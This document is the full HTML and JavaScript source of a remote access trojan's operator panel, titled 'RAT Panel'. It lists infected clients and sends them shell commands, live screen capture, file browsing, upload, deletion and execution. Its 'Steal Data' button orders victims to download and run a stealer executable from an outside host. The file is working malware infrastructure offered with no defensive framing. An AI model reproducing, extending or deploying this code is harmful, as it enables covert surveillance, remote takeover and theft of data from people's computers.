<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8" />
  <title>RAT Panel</title>
  <style>
    body { 
      font-family: sans-serif; 
      margin: 0;
      padding: 0;
      display: flex;
      min-height: 100vh;
    }
    
    /* Sidebar styles */
    .sidebar {
      width: 200px;
      background-color: #2c3e50;
      color: white;
      padding: 1rem;
      box-shadow: 2px 0 5px rgba(0,0,0,0.1);
    }
    
    .sidebar h1 {
      font-size: 1.2rem;
      margin-bottom: 1.5rem;
      padding-bottom: 1rem;
      border-bottom: 1px solid #34495e;
    }
    
    .sidebar select {
      width: 100%;
      margin-bottom: 1.5rem;
      background-color: #34495e;
      color: white;
      border: none;
      padding: 0.5rem;
      border-radius: 4px;
    }
    
    /* Main content styles */
    .main-content {
      flex: 1;
      padding: 2rem;
    }
    
    /* Button styles */
    .tab-button {
      display: block;
      width: 100%;
      padding: 0.8rem;
      margin-bottom: 0.8rem;
      background-color: #3498db;
      color: white;
      border: none;
      border-radius: 4px;
      cursor: pointer;
      font-size: 1rem;
      text-align: left;
      transition: all 0.3s ease;
      position: relative;
      overflow: hidden;
    }
    
    .tab-button:hover {
      background-color: #2980b9;
      transform: translateX(5px);
    }
    
    .tab-button:active {
      transform: scale(0.95);
    }
    
    .tab-button::after {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(255,255,255,0.2);
      transform: translateX(-100%);
      transition: transform 0.3s ease;
    }
    
    .tab-button:hover::after {
      transform: translateX(0);
    }
    
    /* Tab content styles */
    select, input, button { margin: 0.5rem 0; padding: 0.4rem; font-size: 1rem; }
    textarea, #explorer { width: 100%; margin-top: 1rem; font-family: monospace; }
    textarea { height: 200px; }
    img { margin-top: 1rem; border: 1px solid #ccc; max-width: 100%; }
    .hidden { display: none; }
    ul { list-style: none; padding-left: 0; }
    li:hover { background-color: #eee; cursor: pointer; }
    #contextMenu {
      position: absolute;
      display: none;
      background: white;
      border: 1px solid #ccc;
      box-shadow: 2px 2px 6px rgba(0,0,0,0.1);
      z-index: 1000;
    }
    #contextMenu div {
      padding: 5px 10px;
      cursor: pointer;
    }
    #contextMenu div:hover {
      background: #eee;
    }
    pre {
      background: #f5f5f5;
      padding: 10px;
      border-radius: 4px;
      white-space: pre-wrap;
      word-wrap: break-word;
    }
    .stealer-container {
      display: flex;
      gap: 1rem;
      margin-top: 1rem;
    }
    .stealer-column {
      flex: 1;
    }

    /* Dark theme styles */
    body.dark {
      background-color: #121212;
      color: #f0f0f0;
    }
    body.dark .sidebar {
      background-color: #1a1a1a;
      border-right: 1px solid #333;
    }
    body.dark .sidebar h1 {
      border-bottom-color: #333;
    }
    body.dark .sidebar select {
      background-color: #333;
      color: #f0f0f0;
    }
    body.dark .tab-button {
      background-color: #444;
    }
    body.dark .tab-button:hover {
      background-color: #555;
    }
    body.dark textarea,
    body.dark input,
    body.dark select,
    body.dark button,
    body.dark #explorer,
    body.dark #contextMenu,
    body.dark pre {
      background-color: #1e1e1e;
      color: #f0f0f0;
      border: 1px solid #444;
    }
    body.dark li:hover {
      background-color: #333;
    }
    body.dark #contextMenu div:hover {
      background: #444;
    }
    
    /* Theme toggle button */
    #themeToggle {
      position: fixed;
      top: 10px;
      right: 10px;
      font-size: 1.2rem;
      background: none;
      border: none;
      cursor: pointer;
      z-index: 1000;
      padding: 0.5rem;
      border-radius: 50%;
      width: 40px;
      height: 40px;
      display: flex;
      align-items: center;
      justify-content: center;
      transition: all 0.3s ease;
    }
    
    body:not(.dark) #themeToggle {
      background-color: #f0f0f0;
    }
    
    body.dark #themeToggle {
      background-color: #333;
    }
    
    #themeToggle:hover {
      transform: rotate(30deg);
    }
    
    /* Action buttons in tabs */
    .action-button {
      padding: 0.6rem 1rem;
      background-color: #3498db;
      color: white;
      border: none;
      border-radius: 4px;
      cursor: pointer;
      font-size: 1rem;
      transition: all 0.2s ease;
      margin-right: 0.5rem;
    }
    
    .steal-button {
      background-color: #e74c3c;
    }
    
    .save-button {
      background-color: #2ecc71;
    }
    
    .action-button:hover {
      transform: translateY(-2px);
      box-shadow: 0 2px 5px rgba(0,0,0,0.2);
    }
    
    .action-button:active {
      transform: translateY(0);
      box-shadow: none;
    }
    
    .steal-button:hover {
      background-color: #c0392b;
    }
    
    .save-button:hover {
      background-color: #27ae60;
    }
  </style>
</head>
<body>
  <button id="themeToggle" title="Toggle theme">
    🌙
  </button>
  
  <!-- Sidebar -->
  <div class="sidebar">
    <h1>Connected Clients</h1>
    <select id="clientList"></select>
    
    <button class="tab-button" onclick="showTab('cmd')">CMD</button>
    <button class="tab-button" onclick="showTab('screen')">Screen</button>
    <button class="tab-button" onclick="showTab('explorer')">Explorer</button>
    <button class="tab-button" onclick="showTab('stealer')">Stealer</button>
  </div>
  
  <!-- Main content -->
  <div class="main-content">
    <div id="cmdTab">
      <h2>Command Execution</h2>
      <input id="cmdInput" placeholder="Enter command..." />
      <button class="action-button" onclick="sendCommand()">Send CMD</button>
      <textarea id="output" readonly></textarea>
    </div>

    <div id="screenTab" class="hidden">
      <h2>Live Screen</h2>
      <button class="action-button" onclick="startScreen()">Start Screen</button>
      <button class="action-button" onclick="stopScreen()">Stop Screen</button>
      <img id="screenshot" src="" />
    </div>

    <div id="explorerTab" class="hidden">
      <h2>File Explorer</h2>
      <div id="pathDisplay" style="margin-bottom: 0.5rem; font-family: monospace;"></div>
      <input type="file" id="uploadInput" />
      <progress id="uploadProgress" value="0" max="100" style="width:100%; display:none;"></progress>
      <button class="action-button" onclick="upload()">Upload</button>
      <div id="explorer"></div>
    </div>

    <div id="stealerTab" class="hidden">
      <h2>Data Stealer</h2>
      <button class="action-button steal-button" onclick="stealData()">Steal Data</button>
      <pre id="stealerStatus"></pre>
      <div class="stealer-container">
        <div class="stealer-column">
          <h3>Status</h3>
        <pre id="stealerData">No data</pre>
      </div>
    </div>
      </div>
    </div>
  </div>

  <div id="contextMenu">
    <div onclick="deleteFile()">Delete</div>
    <div onclick="openFile()">Run</div>
  </div>

  <script>
    let selectedClient = "";
    let currentPath = "C:\\\\";
    let rightClickedPath = "";

    const output = document.getElementById("output");
    const explorer = document.getElementById("explorer");

    function loadClients() {
      fetch("/clients")
        .then(res => res.json())
        .then(data => {
          const list = document.getElementById("clientList");
          list.innerHTML = "";
          data.forEach(id => {
            const opt = document.createElement("option");
            opt.value = id;
            opt.textContent = id;
            list.appendChild(opt);
          });
          if (data.length) selectedClient = data[0];
        });
    }

    document.getElementById("clientList").addEventListener("change", (e) => {
      selectedClient = e.target.value;
    });

    function sendCommand() {
      const cmd = document.getElementById("cmdInput").value;
      if (!selectedClient || !cmd) return;

      fetch(`/send/${selectedClient}`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ type: "cmd", data: cmd })
      }).then(res => {
        if (res.ok) {
          output.value += `[-> ${selectedClient}] ${cmd}\n`;
        } else {
          output.value += `[!!] Failed to send command\n`;
        }
      });
    }

    function startScreen() {
      if (!selectedClient) return;
      fetch(`/send/${selectedClient}`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ type: "start_screen", data: "" })
      });
    }

    function stopScreen() {
      if (!selectedClient) return;
      fetch(`/send/${selectedClient}`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ type: "stop_screen", data: "" })
      });
    }

    function showTab(tab) {
      ["cmdTab", "screenTab", "explorerTab", "stealerTab"].forEach(id => {
        document.getElementById(id).classList.add("hidden");
      });
      document.getElementById(tab + "Tab").classList.remove("hidden");

      if (tab === "explorer") {
        sendLs(currentPath);
      }
    }

    function sendLs(path) {
      if (!selectedClient) return;
      fetch(`/send/${selectedClient}`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ type: "ls", data: path })
      });
    }

    function deleteFile() {
      hideContextMenu();
      if (!selectedClient || !rightClickedPath) return;
      fetch(`/send/${selectedClient}`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ type: "rm", data: rightClickedPath })
      }).then(() => {
        sendLs(currentPath);
      });
    }

    function openFile() {
      hideContextMenu();
      if (!selectedClient || !rightClickedPath) return;
      fetch(`/send/${selectedClient}`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ type: "open", data: rightClickedPath })
      }).then(() => {
        sendLs(currentPath);
      });
    }

    function renderExplorer(list) {
      explorer.innerHTML = "";
      const ul = document.createElement("ul");
      document.getElementById("pathDisplay").textContent = currentPath;

      if (list.parent) {
        const liUp = document.createElement("li");
        liUp.textContent = "..";
        liUp.onclick = () => {
          currentPath = list.parent;
          sendLs(currentPath);
        };
        ul.appendChild(liUp);
      }

      list.items.forEach(item => {
        const li = document.createElement("li");
        li.textContent = item.name;
        li.oncontextmenu = (e) => {
          e.preventDefault();
          rightClickedPath = item.full;
          showContextMenu(e.pageX, e.pageY);
        };
        if (item.dir) {
          li.style.fontWeight = "bold";
          li.onclick = () => {
            currentPath = item.full;
            sendLs(currentPath);
          };
        }
        ul.appendChild(li);
      });

      explorer.appendChild(ul);
    }

    function upload() {
      const file = document.getElementById("uploadInput").files[0];
      const progress = document.getElementById("uploadProgress");
      if (!file || !selectedClient) return;

      const reader = new FileReader();
      reader.onload = function() {
        const base64Data = reader.result.split(",")[1];
        const payload = {
          filename: currentPath.endsWith("\\") ? currentPath + file.name : currentPath + "\\" + file.name,
          content: base64Data
        };

        progress.style.display = "block";
        progress.value = 0;

        fetch(`/send/${selectedClient}`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ type: "upload", data: JSON.stringify(payload) })
        }).then(res => {
          progress.style.display = "none";
          if (res.ok) {
            output.value += `[-> ${selectedClient}] Uploaded ${file.name} to ${currentPath}\n`;
            sendLs(currentPath);
          } else {
            output.value += `[!!] Failed to send upload\n`;
          }
        }).catch(error => {
          progress.style.display = "none";
          output.value += `[!!] Upload error: ${error}\n`;
        });
      };

      reader.onprogress = function(evt) {
        if (evt.lengthComputable) {
          const percent = (evt.loaded / evt.total) * 100;
          progress.value = percent;
        }
      };

      reader.readAsDataURL(file);
    }


    function hideContextMenu() {
      document.getElementById("contextMenu").style.display = "none";
    }

    window.onclick = hideContextMenu;

    function stealData() {
      const statusEl = document.getElementById('stealerStatus');
      statusEl.textContent = "Starting stealer...";
      
      fetch(`/send/${selectedClient}`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          type: "run_stealer",
          data: "https://panel-agzz.onrender.com/apps/steller.exe"
        })
      })
      .then(() => {
        statusEl.textContent = "Stealer activated successfully!";
      })
      .catch(err => {
        statusEl.textContent = "Error: " + err.message;
      });
    }

    const ws = new WebSocket(`wss://${location.host}/admin`);
    ws.onmessage = (event) => {
      const msg = JSON.parse(event.data);
      if (msg.type === "screen") {
        document.getElementById("screenshot").src = "data:image/jpeg;base64," + msg.data;
      } else if (msg.type === "result") {
        output.value += `[<- ${selectedClient}] ${msg.data}\n`;
      } else if (msg.type === "explorer") {
        renderExplorer(JSON.parse(msg.data));
      } else if (msg.type === "stealer") {
        document.getElementById("stealerData").textContent = msg.data;
      }
    };

    setInterval(loadClients, 5000);
    loadClients();

    const themeToggle = document.getElementById("themeToggle");

    function applyTheme(isDark) {
      document.body.classList.toggle("dark", isDark);
      themeToggle.textContent = isDark ? "☀️" : "🌙";
      localStorage.setItem("theme", isDark ? "dark" : "light");
    }

    const savedTheme = localStorage.getItem("theme");
    applyTheme(savedTheme === "dark");

    themeToggle.onclick = () => {
      const isDark = !document.body.classList.contains("dark");
      applyTheme(isDark);
    };

    function showContextMenu(x, y) {
      const menu = document.getElementById("contextMenu");
      menu.style.left = x + "px";
      menu.style.top = y + "px";
      menu.style.display = "block";
    }
  </script>
</body>
</html>
